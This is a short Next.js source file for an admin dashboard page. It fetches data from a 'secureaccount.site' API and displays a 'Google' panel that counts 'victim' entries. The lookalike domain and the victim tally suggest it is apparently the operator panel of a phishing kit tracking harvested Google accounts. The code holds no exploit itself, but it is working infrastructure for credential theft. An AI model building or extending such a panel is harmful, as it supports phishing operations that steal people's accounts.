import Link from "next/link";
import styles from "./page.module.css";

export default async function Dashboard() {
  const host = "https://secureaccount.site";
  const google = await fetch(`${host}/api/google`, {
    cache: "no-store",
  }).then((res) => res.json());

  return (
    <div className={styles.page}>
      <h2 className={styles.header}>Dashboard</h2>
      <div className="boxes">
        <Link className={styles.google} href="/admin/google">
          <div className={styles.box}>
            <div>
              <p>Google</p>
              <i className="fa-solid fa-chart-simple"></i>
            </div>
            <span>victim: {google?.length}</span>
          </div>
        </Link>
      </div>
    </div>
  );
}
